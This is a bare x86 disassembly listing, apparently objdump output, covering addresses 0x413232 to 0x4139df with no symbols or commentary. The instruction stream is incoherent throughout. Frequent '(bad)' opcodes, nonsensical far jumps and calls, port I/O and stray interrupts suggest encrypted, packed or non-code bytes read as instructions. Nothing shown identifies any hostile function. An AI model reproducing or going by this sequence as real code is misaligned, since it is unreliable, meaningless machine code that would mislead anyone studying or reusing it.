  413232:	or     bl,BYTE PTR [edi]
  413234:	ins    DWORD PTR es:[edi],dx
  413235:	add    BYTE PTR [ecx-0x1c],ch
  413238:	mov    al,0x1a
  41323a:	daa    
  41323b:	push   0x3e323c82
  413240:	scas   eax,DWORD PTR es:[edi]
  413241:	push   edx
  413242:	jns    0x4131c6
  413244:	lods   eax,DWORD PTR ds:[esi]
  413245:	cwde   
  413246:	fdivp  st(4),st
  413248:	gs mov dl,0x6e
  41324b:	mov    bh,0x84
  41324d:	outs   dx,DWORD PTR ds:[esi]
  41324e:	pop    es
  41324f:	imul   eax,DWORD PTR [edx],0xffffff8d
  413252:	leave  
  413253:	cmp    edi,esp
  413255:	push   eax
  413256:	ins    DWORD PTR es:[edi],dx
  413257:	sbb    DWORD PTR [edi+ecx*2-0x49e1aac6],ecx
  41325e:	out    0x78,al
  413260:	cmc    
  413261:	cmc    
  413262:	or     al,BYTE PTR [ebp-0x2f]
  413265:	mov    ch,0xfe
  413268:	into   
  413269:	cmp    esp,DWORD PTR [ebx+0x11]
  41326c:	loope  0x413209
  41326e:	sub    ebx,DWORD PTR [ecx-0x30]
  413271:	mov    eax,0x9524b36e
  413276:	pop    ebx
  413277:	loop   0x4132b4
  413279:	add    al,0x61
  41327b:	cmp    DWORD PTR [edi-0x34],ecx
  41327e:	and    dl,dl
  413280:	mov    al,ds:0xf5e45554
  413285:	pop    edi
  413286:	shl    ch,cl
  413288:	out    dx,eax
  413289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41328a:	cli    
  41328b:	pusha  
  41328c:	dec    ecx
  41328d:	cmp    BYTE PTR [esi-0x46],bl
  413290:	gs in  eax,dx
  413292:	iret   
  413293:	js     0x4132e9
  413295:	mov    DWORD PTR [esi+0x3c],ebp
  413298:	adc    BYTE PTR [ebp-0x6d2cf697],0x9c
  41329f:	cmp    BYTE PTR [ecx],bl
  4132a1:	jb     0x4132ab
  4132a3:	add    edx,ebx
  4132a5:	mov    ds,WORD PTR [ebp+edx*8+0x12]
  4132a9:	adc    cl,dh
  4132ab:	das    
  4132ac:	xor    eax,0xe709cc80
  4132b1:	nop    DWORD PTR [esi+edx*8]
  4132b5:	lods   eax,DWORD PTR ds:[esi]
  4132b6:	lds    ecx,FWORD PTR [esi+0x145e8a44]
  4132bc:	adc    eax,0xc6d66ef1
  4132c1:	jmp    0x38d7:0x64f72413
  4132c8:	xchg   ecx,eax
  4132c9:	and    cl,BYTE PTR [esi]
  4132cb:	in     al,0xa1
  4132cd:	ins    DWORD PTR es:[edi],dx
  4132ce:	(bad)  
  4132cf:	inc    esi
  4132d0:	mul    BYTE PTR [esi-0x1ad35c4f]
  4132d6:	add    BYTE PTR [edi+0x3925f915],bl
  4132dc:	xor    edx,DWORD PTR [eax+0x2e]
  4132df:	fstp   TBYTE PTR [edi+0x2]
  4132e2:	xor    ch,dl
  4132e4:	cmc    
  4132e5:	mov    edx,0xbafb957f
  4132ea:	stos   DWORD PTR es:[edi],eax
  4132eb:	pop    es
  4132ec:	cmp    BYTE PTR gs:[esi+ecx*2-0x200c62ef],ah
  4132f4:	lahf   
  4132f5:	repnz outs dx,BYTE PTR ds:[esi]
  4132f7:	and    BYTE PTR [ecx-0x73cd0e58],al
  4132fd:	lods   eax,DWORD PTR ds:[esi]
  4132fe:	loope  0x413338
  413300:	mov    al,0xcd
  413302:	inc    ecx
  413303:	(bad)  
  413304:	jmp    0x3fe7:0xf5f9aa2c
  41330b:	add    al,0x6b
  41330d:	imul   DWORD PTR [esi]
  41330f:	mov    bh,0x99
  413311:	cmp    esp,esp
  413313:	mov    bh,BYTE PTR [esi]
  413315:	sbb    cl,BYTE PTR [ebp-0x5ef83b9f]
  41331b:	push   ebp
  41331c:	and    eax,0x676cec38
  413321:	dec    ebx
  413322:	scas   al,BYTE PTR es:[edi]
  413323:	lods   al,BYTE PTR ds:[esi]
  413324:	aaa    
  413325:	xor    edi,ebx
  413327:	sub    DWORD PTR [esi],edi
  413329:	loope  0x413322
  41332b:	push   ebx
  41332c:	mov    eax,ds:0x424f03ab
  413331:	sbb    ebp,DWORD PTR [esi+0x1a]
  413334:	addr16 retf 
  413336:	mov    eax,ds:0x915a972d
  41333b:	cmp    BYTE PTR [edi-0x6448ec0],al
  413341:	pop    es
  413342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413344:	cmc    
  413345:	pop    esp
  413346:	out    dx,eax
  413347:	(bad)  
  413348:	xor    al,BYTE PTR [edx+0x3815ceaa]
  41334e:	sub    eax,0x77113dd4
  413353:	and    cl,BYTE PTR [eax-0x57]
  413356:	outs   dx,BYTE PTR ds:[esi]
  413357:	cli    
  413358:	cmp    DWORD PTR [ebx+ecx*1-0x6453fcd5],eax
  41335f:	sub    esp,DWORD PTR [eax+edx*4+0x7a55f4a8]
  413366:	lea    edx,[ecx+0x15]
  413369:	aad    0x75
  41336b:	sar    DWORD PTR [esi-0x80],cl
  41336e:	inc    ebx
  41336f:	les    eax,FWORD PTR [ebp+0x12]
  413372:	sub    dh,BYTE PTR [eax+ebp*2+0xa]
  413376:	xchg   ecx,eax
  413377:	mov    ah,0xc0
  413379:	cmp    eax,edi
  41337b:	imul   ebp,DWORD PTR [edx+0x460e5467],0x6d
  413382:	mov    ds:0x503bbb15,al
  413387:	jmp    0x3bb0:0x6618d803
  41338e:	push   edi
  41338f:	jno    0x413380
  413391:	xor    DWORD PTR [ebx-0x80],esp
  413394:	xchg   esp,eax
  413395:	pop    edx
  413396:	outs   dx,DWORD PTR ds:[esi]
  413397:	dec    edi
  413398:	sbb    esi,DWORD PTR [ecx+0xc2ba154]
  41339e:	mov    ch,0x38
  4133a0:	hlt    
  4133a1:	fcmovnb st,st(3)
  4133a3:	js     0x413329
  4133a5:	ja     0x4133b7
  4133a7:	aad    0xf5
  4133a9:	lds    ebx,FWORD PTR [edi]
  4133ab:	cs adc al,0x20
  4133ae:	push   esp
  4133af:	js     0x4133d8
  4133b1:	cmp    BYTE PTR [ebx+0x7af3af11],dh
  4133b7:	sub    BYTE PTR [eax-0x65],al
  4133ba:	outs   dx,BYTE PTR ds:[esi]
  4133bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133bc:	inc    ebp
  4133bd:	ror    DWORD PTR [esi],0x13
  4133c0:	arpl   dx,dx
  4133c2:	in     eax,dx
  4133c3:	aas    
  4133c4:	pop    esi
  4133c5:	les    esi,FWORD PTR [ebx+0x1ecd0ebd]
  4133cb:	adc    BYTE PTR [ebx],dh
  4133cd:	push   ss
  4133ce:	out    0x36,al
  4133d0:	call   0xf7ff4d19
  4133d5:	xor    bh,dl
  4133d7:	imul   ecx,edx,0xb6e48e17
  4133dd:	cmp    esp,DWORD PTR [edx+eax*4+0x29]
  4133e1:	clc    
  4133e2:	sub    eax,0x6eed6f71
  4133e7:	icebp  
  4133e8:	mov    eax,ds:0xacb93c33
  4133ed:	xchg   ebp,eax
  4133ee:	dec    ecx
  4133ef:	cmp    ecx,ecx
  4133f1:	mov    WORD PTR [ebp-0x77c2c153],cs
  4133f7:	int3   
  4133f8:	aas    
  4133f9:	dec    edi
  4133fa:	xchg   ebx,eax
  4133fb:	mov    eax,0x8d67a3a7
  413400:	and    ebx,DWORD PTR [eax-0x7c]
  413403:	lock mov ss,ebx
  413406:	outs   dx,BYTE PTR ds:[esi]
  413407:	mov    al,ds:0xfcd123a9
  41340c:	sub    edi,0xffffffe3
  41340f:	push   ds
  413410:	jp     0x4133b1
  413412:	outs   dx,BYTE PTR ds:[esi]
  413413:	loopne 0x41340c
  413415:	sub    esi,DWORD PTR [ecx-0x5bbcb940]
  41341b:	ds popa 
  41341d:	dec    eax
  41341e:	add    eax,esp
  413420:	mov    BYTE PTR [ecx],cl
  413422:	cmc    
  413423:	mov    edi,0xcec0d82c
  413428:	adc    al,0x68
  41342a:	pop    ebx
  41342b:	sti    
  41342c:	cmc    
  41342d:	jmp    0x41349f
  41342f:	jbe    0x413409
  413431:	rcr    edi,1
  413433:	dec    ebp
  413434:	jne    0x4134a7
  413436:	inc    ebx
  413437:	jb     0x41343d
  413439:	dec    eax
  41343a:	test   al,0xd4
  41343c:	adc    ecx,DWORD PTR [edi]
  41343e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41343f:	dec    esp
  413440:	mov    edx,0xe2b5b03c
  413445:	dec    edi
  413446:	sti    
  413447:	push   0x38e4a5c5
  41344c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41344d:	fld    TBYTE PTR [edx+0x7ca307b1]
  413453:	pusha  
  413454:	ds clc 
  413456:	dec    ebx
  413457:	mov    ecx,0x70661131
  41345c:	cdq    
  41345d:	pop    ecx
  41345e:	scas   al,BYTE PTR es:[edi]
  41345f:	cmp    BYTE PTR [ecx],ch
  413461:	mov    ch,0x1c
  413463:	inc    esp
  413464:	in     al,0xdf
  413466:	fdivr  QWORD PTR [ebp+esi*8+0x7f3418cd]
  41346d:	xchg   BYTE PTR [ebx+0x6e],dh
  413470:	les    edi,FWORD PTR [ebx]
  413472:	mov    ecx,eax
  413474:	(bad)  
  413476:	inc    eax
  413477:	sub    eax,0xf56a622a
  41347c:	adc    eax,0x4e89995
  413481:	mov    edx,0xaadb90d
  413486:	fs ins DWORD PTR es:[edi],dx
  413488:	cmp    DWORD PTR [ebx],0xffffffb2
  41348b:	ret    
  41348c:	mov    ah,0xf8
  41348e:	not    DWORD PTR [ecx+0x3f54db7e]
  413494:	cmc    
  413495:	mov    edi,0xc8c2828c
  41349a:	mov    BYTE PTR [ecx],ch
  41349c:	ja     0x4134db
  41349e:	scas   eax,DWORD PTR es:[edi]
  41349f:	retf   0x47f4
  4134a2:	or     al,0x84
  4134a4:	lods   eax,DWORD PTR ds:[esi]
  4134a5:	shl    BYTE PTR [ecx-0x417a0ae5],1
  4134ab:	add    edi,DWORD PTR [edx]
  4134ad:	push   ss
  4134ae:	mov    ds:0x153871df,al
  4134b3:	xchg   ebx,eax
  4134b4:	out    0x57,al
  4134b6:	jns    0x41352d
  4134b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134b9:	mov    eax,ds:0x4758a16e
  4134be:	lahf   
  4134bf:	aaa    
  4134c0:	enter  0x8a65,0x38
  4134c4:	or     BYTE PTR [ecx+ecx*1-0x170b23b2],0xcc
  4134cc:	cmc    
  4134cd:	push   ebp
  4134ce:	lock imul edx,DWORD PTR [edi+0x3a],0x5dffcb5b
  4134d6:	xchg   ebp,eax
  4134d7:	cmp    cl,dh
  4134d9:	pushf  
  4134da:	mov    edx,0x54c2077
  4134df:	jle    0x4134a6
  4134e1:	call   0xb901bb98
  4134e6:	outs   dx,BYTE PTR ds:[esi]
  4134e7:	fwait
  4134e8:	call   0x5614:0x30904af9
  4134ef:	sbb    eax,0x3882f43e
  4134f4:	gs jp  0x4134e5
  4134f7:	push   es
  4134f8:	jo     0x41350d
  4134fa:	mov    ds:0xf7382af6,eax
  4134ff:	push   ss
  413500:	lock ror BYTE PTR [ecx],0xf5
  413504:	into   
  413505:	sub    DWORD PTR [eax],esi
  413507:	cmp    DWORD PTR [edx+0x6c],ebp
  41350a:	mov    edx,0xe23014cc
  41350f:	aas    
  413510:	cmc    
  413511:	ficom  DWORD PTR [ecx+edx*4-0x58d755ee]
  413518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413519:	cmp    esp,ebx
  41351b:	sub    BYTE PTR [ecx-0x1dc2ca62],al
  413521:	data16 jbe 0x41358a
  413524:	mov    eax,ds:0xa8396955
  413529:	scas   al,BYTE PTR es:[edi]
  41352a:	mov    cl,BYTE PTR [eax+0x63]
  41352d:	sub    BYTE PTR [ebp-0x3b8945c4],al
  413533:	jnp    0x41354e
  413535:	cmp    DWORD PTR [edx],ebp
  413537:	repz sbb eax,0x1c683040
  41353d:	mov    ds:0x24aa391c,al
  413542:	dec    edx
  413543:	xchg   esi,eax
  413544:	add    al,0xe1
  413546:	sbb    BYTE PTR [ebp+0x34e7ddf5],ah
  41354c:	inc    eax
  41354d:	mov    esi,0xa68c0dc4
  413552:	xchg   edx,eax
  413553:	cmp    BYTE PTR [edx+0x1e],dh
  413556:	sbb    eax,0x45198265
  41355b:	rcl    DWORD PTR [ebp*8-0x4deb100f],1
  413562:	mov    eax,ds:0x14ec42b8
  413567:	cmp    eax,0x3dc562f3
  41356c:	int    0x80
  41356e:	add    ebp,DWORD PTR ds:0x8c2738e8
  413574:	push   esp
  413575:	rcr    eax,0x8e
  413578:	cmc    
  413579:	ret    0x580e
  41357c:	xor    ah,BYTE PTR [esi+0x16]
  41357f:	inc    esi
  413580:	ja     0x4135b3
  413582:	fdivr  QWORD PTR ds:0x393b9ddf
  413588:	outs   dx,DWORD PTR ds:[esi]
  413589:	jnp    0x413520
  41358b:	(bad)  
  41358c:	in     al,dx
  41358d:	sub    ch,ah
  41358f:	mov    ecx,DWORD PTR [edi-0x5e]
  413592:	cmc    
  413593:	out    dx,al
  413594:	rcr    DWORD PTR [ebx-0x197a4f08],cl
  41359a:	lock cmp BYTE PTR [edx+0x5fbb7d75],al
  4135a1:	repz pop ebp
  4135a3:	test   eax,0x7bc108f5
  4135a8:	or     bh,BYTE PTR [esi-0x18]
  4135ab:	cmp    ebp,ebp
  4135ad:	cmp    BYTE PTR ds:0x4230fe02,dh
  4135b3:	push   edi
  4135b4:	jmp    0xb158:0x192b6e86
  4135bb:	jno    0x4135ee
  4135bd:	stos   BYTE PTR es:[edi],al
  4135be:	in     al,0x38
  4135c0:	out    dx,al
  4135c1:	xor    BYTE PTR [edx-0x1e],0xf
  4135c5:	pop    ecx
  4135c6:	je     0x4135d9
  4135c8:	aas    
  4135c9:	cdq    
  4135ca:	or     eax,DWORD PTR [esi-0x246247e4]
  4135d0:	popa   
  4135d1:	lods   eax,DWORD PTR ds:[esi]
  4135d2:	jmp    0x357c2878
  4135d7:	pop    edx
  4135d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135d9:	pop    ebx
  4135da:	fiadd  WORD PTR [ebx]
  4135dc:	lods   eax,DWORD PTR ds:[esi]
  4135dd:	push   edi
  4135de:	mov    ebp,0xcefff50b
  4135e3:	sbb    bh,cl
  4135e5:	icebp  
  4135e6:	jle    0x4135f5
  4135e8:	loope  0x413584
  4135ea:	add    al,0xf9
  4135ec:	and    eax,0xfa393180
  4135f1:	xchg   esp,eax
  4135f2:	shl    BYTE PTR [edi-0x4bf27de2],cl
  4135f8:	jns    0x413625
  4135fa:	outs   dx,DWORD PTR ds:[esi]
  4135fb:	cmp    DWORD PTR ds:0xb8f9575b,edi
  413601:	cmp    eax,0xf0ce05ce
  413606:	outs   dx,DWORD PTR ds:[esi]
  413607:	mov    al,gs:0xf1deef7b
  41360d:	push   ebx
  41360e:	loop   0x413657
  413610:	cmp    eax,0xb1b8cb2d
  413615:	das    
  413616:	pop    ds
  413617:	retf   0x5ba8
  41361a:	repz cmp BYTE PTR [esi],al
  41361d:	pop    ebp
  41361e:	shr    BYTE PTR [ebx-0x522def70],0xf5
  413625:	pop    ss
  413626:	sub    eax,0xc6cfece7
  41362b:	lahf   
  41362c:	test   BYTE PTR [ebx],bh
  41362e:	ins    DWORD PTR es:[edi],dx
  41362f:	dec    ebx
  413630:	inc    DWORD PTR [eax]
  413632:	pop    ecx
  413633:	ret    
  413634:	push   es
  413635:	aaa    
  413636:	outs   dx,BYTE PTR ds:[esi]
  413637:	mov    ebx,0x48f99b20
  41363c:	ror    BYTE PTR [edx-0x4c],cl
  41363f:	cmp    ebx,edx
  413641:	(bad)  [ecx-0x75790ff6]
  413647:	or     BYTE PTR [ecx],dh
  413649:	mov    ds:0xba84aba6,al
  41364e:	add    al,0x47
  413650:	cmp    eax,eax
  413652:	aad    0x1d
  413654:	inc    ebp
  413655:	(bad)  
  413656:	mov    esi,0x22e65c38
  41365b:	adc    eax,0x75e7112
  413660:	cmc    
  413661:	mov    esi,0xdeeca236
  413666:	es jmp 0xe757:0xe67809e2
  41366e:	into   
  41366f:	sbb    DWORD PTR [eax+0x2f],edi
  413672:	add    eax,0x1789f516
  413677:	inc    ecx
  413678:	add    edx,DWORD PTR ds:0x224f6f98
  41367e:	cmp    DWORD PTR cs:[edi],ebx
  413681:	xor    DWORD PTR [ebx],eax
  413683:	lods   al,BYTE PTR ds:[esi]
  413684:	cld    
  413685:	xchg   DWORD PTR [edx-0x74fe1387],esi
  41368b:	add    ebx,DWORD PTR [edi-0x8]
  41368e:	imul   edi,DWORD PTR [ebx],0x5b92b86
  413694:	sub    BYTE PTR [eax],bh
  413696:	fmul   QWORD PTR [ebx+eax*1+0x6bb1d40e]
  41369d:	xchg   ebx,eax
  41369e:	outs   dx,BYTE PTR ds:[esi]
  41369f:	call   0x19fee275
  4136a4:	into   
  4136a5:	mov    ds:0x25ca05a5,eax
  4136aa:	jge    0x41368e
  4136ac:	inc    esi
  4136ad:	lods   eax,DWORD PTR ds:[esi]
  4136ae:	into   
  4136af:	rcr    BYTE PTR [ebp+0x4c],1
  4136b2:	(bad)  
  4136b3:	int    0xec
  4136b5:	adc    edi,DWORD PTR [ecx]
  4136b7:	aas    
  4136b8:	outs   dx,BYTE PTR ds:[esi]
  4136b9:	xchg   edi,eax
  4136ba:	dec    esi
  4136bb:	nop
  4136bc:	das    
  4136bd:	pop    edi
  4136be:	fs cmp ebp,esp
  4136c1:	mov    esp,0x50176ed5
  4136c6:	int    0x57
  4136c8:	cmc    
  4136c9:	push   ecx
  4136ca:	and    esp,DWORD PTR [esi+0x21ce78c6]
  4136d0:	pop    edi
  4136d1:	cmp    BYTE PTR [esi-0x766ff9d9],dh
  4136d7:	test   DWORD PTR [edx+eiz*8-0x436be492],0xfc6cd906
  4136e2:	or     BYTE PTR [eax],dh
  4136e4:	aad    0x27
  4136e6:	dec    BYTE PTR [esp+edx*2+0x7a608af8]
  4136ed:	dec    ebx
  4136ee:	outs   dx,DWORD PTR ds:[esi]
  4136ef:	jmp    0x413747
  4136f1:	stos   BYTE PTR es:[edi],al
  4136f2:	mov    al,0x6b
  4136f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f5:	or     al,0xde
  4136f7:	outs   dx,BYTE PTR ds:[esi]
  4136f9:	fidiv  WORD PTR [ebp-0x3b]
  4136fc:	lock ret 
  4136fe:	into   
  4136ff:	ficomp WORD PTR [ecx+0x3c]
  413702:	fs stc 
  413704:	cmc    
  413705:	test   DWORD PTR [esi-0x16c0be3d],ebx
  41370b:	(bad)  
  41370c:	(bad)  
  41370d:	cmp    esi,DWORD PTR [edi-0x65]
  413710:	mov    ch,0x62
  413712:	pop    esi
  413713:	or     dh,BYTE PTR [ebp-0x57]
  413716:	iret   
  413717:	fdiv   QWORD PTR [ecx+0x48]
  41371a:	dec    eax
  41371b:	int    0xdd
  41371d:	pop    ebx
  41371e:	inc    ebx
  41371f:	dec    edi
  413720:	not    BYTE PTR [esi]
  413722:	aaa    
  413723:	dec    ecx
  413725:	aas    
  413726:	(bad)  
  413727:	add    al,0x9f
  413729:	jnp    0x4137a8
  41372b:	frstor [edi-0x836d902]
  413731:	sub    DWORD PTR [edx+0x47],edi
  413734:	xchg   edi,eax
  413735:	outs   dx,BYTE PTR ds:[esi]
  413736:	sbb    ecx,ebx
  413738:	ds repz mov bl,0x38
  41373c:	jge    0x413753
  41373e:	xchg   edi,eax
  41373f:	mov    cl,0xb7
  413741:	xchg   esp,eax
  413742:	sbb    eax,0x6966f530
  413747:	sahf   
  413748:	bound  edx,QWORD PTR [edx+eax*4-0x7]
  41374c:	(bad)  
  41374d:	cmp    edi,DWORD PTR [edx+0x5cae795b]
  413753:	jmp    0x78af5512
  413758:	std    
  413759:	cmp    DWORD PTR [edi+0xab7e6f0],ebp
  41375f:	int3   
  413760:	and    al,0x38
  413762:	push   ebp
  413763:	lahf   
  413764:	fwait
  413765:	cmp    eax,0x780a4f4
  41376a:	outs   dx,BYTE PTR ds:[esi]
  41376b:	call   0x9e7c:0x78517114
  413772:	ins    BYTE PTR es:[edi],dx
  413773:	cmp    DWORD PTR [esi-0x19caf509],ebp
  413779:	inc    edx
  41377a:	ficomp WORD PTR [esi]
  41377c:	sbb    al,0x65
  41377e:	mov    al,ds:0x339ef580
  413783:	ja     0x41379b
  413785:	lock push edx
  413787:	xor    BYTE PTR [ebx],dl
  413789:	sahf   
  41378a:	fild   WORD PTR [edx+ebp*1]
  41378d:	pop    eax
  41378e:	pop    ebx
  41378f:	out    dx,eax
  413790:	jge    0x41372b
  413792:	jge    0x41378f
  413794:	mov    dh,0xfc
  413796:	mov    ebp,0xcf38f153
  41379b:	sub    DWORD PTR [esi],ebx
  41379d:	pop    ecx
  41379e:	jbe    0x413764
  4137a0:	mov    bh,0x3b
  4137a2:	sahf   
  4137a3:	scas   al,BYTE PTR es:[edi]
  4137a4:	(bad)  
  4137a5:	jmp    0x9769:0x8c0ad66f
  4137ac:	sbb    DWORD PTR [edx],ecx
  4137ae:	repnz es iret 
  4137b1:	mov    al,0x9e
  4137b3:	mov    esp,0x389d72d1
  4137b8:	sub    DWORD PTR [ebx],esi
  4137ba:	pop    edi
  4137bb:	and    BYTE PTR [ecx+0x55],al
  4137be:	iret   
  4137bf:	jnp    0x4137b6
  4137c1:	fisubr DWORD PTR [edi+ecx*1]
  4137c4:	scas   eax,DWORD PTR es:[edi]
  4137c5:	aad    0xad
  4137c7:	lea    edi,[ecx+0x38]
  4137ca:	pop    esi
  4137cb:	xchg   dh,bh
  4137cd:	pop    esi
  4137ce:	jns    0x413826
  4137d0:	sub    dl,BYTE PTR [ebp-0x15b3a888]
  4137d6:	outs   dx,BYTE PTR ds:[esi]
  4137d7:	(bad)  
  4137d8:	loope  0x4137db
  4137da:	xor    DWORD PTR [ebx-0x3138c569],esi
  4137e0:	std    
  4137e1:	inc    edi
  4137e2:	pushf  
  4137e3:	sbb    DWORD PTR [eax-0xa1d33b1],eax
  4137e9:	in     al,dx
  4137ea:	add    edx,DWORD PTR [ecx-0x29d63219]
  4137f0:	imul   edi,DWORD PTR [eax],0xfc71f109
  4137f6:	pop    ecx
  4137f7:	inc    ebp
  4137f8:	mov    bh,0xec
  4137fa:	in     al,dx
  4137fb:	mov    esi,ebp
  4137fd:	add    BYTE PTR [edi],bl
  4137ff:	test   BYTE PTR [ebx-0x2e89689d],ah
  413805:	add    DWORD PTR [edx+eax*8-0x5e],ecx
  413809:	cmp    ecx,DWORD PTR [ebp+0x7ca3c9e6]
  41380f:	sbb    ch,dh
  413811:	arpl   WORD PTR [ecx-0x6d65db3e],bp
  413817:	mov    ecx,0xb1c9381e
  41381c:	stos   DWORD PTR es:[edi],eax
  41381d:	dec    ebx
  41381e:	popa   
  41381f:	lds    ebp,FWORD PTR [esi]
  413821:	cdq    
  413822:	outs   dx,BYTE PTR ds:[esi]
  413823:	inc    ebp
  413824:	pop    ss
  413825:	xor    ah,BYTE PTR [eax+ecx*2]
  413828:	or     ecx,ecx
  41382a:	jb     0x4137d4
  41382c:	xchg   edi,eax
  41382d:	cmp    dl,bh
  41382f:	dec    eax
  413830:	xor    al,0xdd
  413832:	jno    0x4138a9
  413834:	shr    DWORD PTR [ebx+0x43e81cf7],0xf
  41383b:	call   0x89175bdd
  413840:	jecxz  0x413817
  413842:	dec    edi
  413843:	icebp  
  413844:	xor    DWORD PTR [ebx-0x1c],edi
  413847:	sub    ebp,DWORD PTR [edx-0x2adae9b9]
  41384d:	ss add al,0x22
  413850:	test   eax,0x2c0c6e94
  413855:	push   es
  413856:	gs cmp esi,esi
  413859:	push   edi
  41385a:	sub    BYTE PTR [ecx],bh
  41385c:	add    BYTE PTR [edi],ch
  41385e:	mov    eax,0x7b62cc63
  413863:	adc    al,0xf5
  413865:	mov    cl,0x24
  413867:	inc    edi
  413868:	outs   dx,BYTE PTR ds:[esi]
  413869:	(bad)  
  41386a:	aad    0xdf
  41386c:	stos   DWORD PTR es:[edi],eax
  41386d:	cmp    ebx,edx
  41386f:	fs stos BYTE PTR es:[edi],al
  413871:	dec    edx
  413872:	pusha  
  413873:	push   0x1e6e87dd
  413878:	push   ss
  413879:	sbb    BYTE PTR [ebp+edi*1+0x388b96a5],0xc2
  413881:	sahf   
  413882:	and    BYTE PTR [ebp-0x2983e6d9],dl
  413888:	cmc    
  413889:	push   esi
  41388a:	iret   
  41388b:	das    
  41388c:	lds    ecx,FWORD PTR [ecx+0x190fcc24]
  413892:	lods   al,BYTE PTR ds:[esi]
  413893:	jge    0x413894
  413895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413896:	adc    DWORD PTR [edi-0x20],0x78
  41389a:	into   
  41389b:	add    bl,BYTE PTR [edi]
  41389d:	pop    ecx
  41389e:	inc    ecx
  41389f:	sbb    eax,ebp
  4138a1:	pop    edx
  4138a2:	popf   
  4138a3:	pop    esp
  4138a4:	jmp    0x413907
  4138a6:	shr    DWORD PTR [eax+0x58d60e0f],1
  4138ac:	data16 cmp BYTE PTR ds:0xc0591962,al
  4138b3:	test   BYTE PTR [esi-0x26049165],dh
  4138b9:	jmp    0x8deef758
  4138be:	xadd   BYTE PTR [esi+0x38],cl
  4138c2:	push   es
  4138c3:	push   ecx
  4138c4:	push   0x6d
  4138c6:	jmp    0x4138a1
  4138c8:	fs das 
  4138ca:	pop    es
  4138cb:	ret    
  4138cc:	cmc    
  4138cd:	add    DWORD PTR [ebp-0x21],edi
  4138d0:	mov    ds:0x7521bd75,eax
  4138d5:	cmp    BYTE PTR [ebx],dh
  4138d7:	mov    esp,0x54aaba2a
  4138dc:	rcl    BYTE PTR [edi+ebx*8+0xb6eec0d],0x37
  4138e4:	mov    ch,0xf1
  4138e6:	out    dx,al
  4138e7:	aad    0xda
  4138e9:	stos   DWORD PTR es:[edi],eax
  4138ea:	cwde   
  4138eb:	cmp    bl,ch
  4138ed:	inc    edx
  4138ee:	jg     0x413925
  4138f0:	inc    esp
  4138f1:	pop    edx
  4138f2:	mov    ebx,ebx
  4138f4:	imul   BYTE PTR [eax+eiz*8]
  4138f7:	test   al,0x61
  4138f9:	sub    DWORD PTR [ecx+0x785bf3f4],0x19
  413900:	mov    ds,WORD PTR [eax]
  413902:	mov    al,ds:0xc4b81ecc
  413907:	push   0x8d7dab07
  41390c:	int    0xfe
  41390e:	outs   dx,BYTE PTR ds:[esi]
  41390f:	bound  esi,QWORD PTR [eax-0x18]
  413912:	jmp    0x413927
  413914:	cwde   
  413915:	daa    
  413916:	cmp    WORD PTR [ebp-0x20],ax
  41391a:	out    dx,eax
  41391b:	push   ebp
  41391c:	mov    ebp,0x146d7cdb
  413921:	retf   0x7923
  413924:	xor    eax,0x89e68c34
  413929:	pushf  
  41392a:	inc    ecx
  41392b:	cmp    DWORD PTR [ecx+ebp*8],edx
  41392e:	in     eax,dx
  41392f:	sbb    al,0x59
  413931:	mov    esi,0xd03268e6
  413936:	inc    esp
  413937:	sub    esi,DWORD PTR [esi+0x2c7e5db3]
  41393d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41393e:	cmp    DWORD PTR [ebp+eax*8+0x2c],ebx
  413942:	sub    BYTE PTR [ebx],0x9f
  413945:	scas   al,BYTE PTR es:[edi]
  413946:	gs mov dh,0xb5
  413949:	mov    eax,0x8bfe33dc
  41394e:	outs   dx,BYTE PTR ds:[esi]
  41394f:	imul   eax,DWORD PTR [esi+0x970b067],0xffffffd9
  413956:	cmp    ecx,DWORD PTR [eax]
  413958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413959:	out    0xc6,eax
  41395b:	xchg   esp,eax
  41395c:	cmc    
  41395d:	mov    esi,0x8fc808e4
  413962:	push   es
  413963:	or     BYTE PTR [edx+0x4],cl
  413966:	mov    eax,0xb27c91ca
  41396b:	xchg   edx,eax
  41396c:	lock ins DWORD PTR es:[edi],dx
  41396e:	test   DWORD PTR [ecx-0x74],0x25186e35
  413975:	pop    ebx
  413976:	mov    eax,ds:0x98fe4d0d
  41397b:	xor    ebp,DWORD PTR [eax*4+0x6967827c]
  413982:	ins    DWORD PTR es:[edi],dx
  413983:	mov    edi,0xcdbc6124
  413988:	xor    eax,0xb5b59ea2
  41398d:	das    
  41398e:	sub    al,0x13
  413990:	pop    ds
  413991:	sbb    edi,edi
  413993:	pop    esi
  413994:	jae    0x4139d5
  413996:	mov    edx,0xcd1cb27
  41399b:	jns    0x41399d
  41399d:	mov    esi,ebx
  41399f:	pop    esi
  4139a0:	cmc    
  4139a1:	jl     0x41393d
  4139a3:	or     esi,edi
  4139a5:	ror    BYTE PTR [eax],1
  4139a7:	fstp   TBYTE PTR [ecx]
  4139a9:	cmp    BYTE PTR [edi-0x68],ch
  4139ac:	dec    ebx
  4139ad:	push   0xffffffcf
  4139af:	mov    ah,0xac
  4139b1:	fnstcw WORD PTR ss:[ebp-0xb]
  4139b5:	ins    DWORD PTR es:[edi],dx
  4139b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b7:	sub    BYTE PTR [eax+0x65],bl
  4139ba:	add    eax,0xaae42151
  4139bf:	sbb    DWORD PTR [esi-0x6d],esi
  4139c2:	xor    BYTE PTR gs:[ebx*8+0x3b27881],ah
  4139ca:	outs   dx,BYTE PTR ds:[esi]
  4139cb:	cmp    al,0xf4
  4139cd:	(bad)  
  4139ce:	sbb    bh,cl
  4139d0:	push   edx
  4139d1:	pop    ds
  4139d2:	dec    esp
  4139d3:	cmp    DWORD PTR [ebx],edi
  4139d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139d6:	sbb    eax,0x72602eb
  4139db:	push   edi
  4139dc:	cmc    
  4139dd:	dec    ecx
  4139de:	push   cs
  4139df:	loope  0x413a35
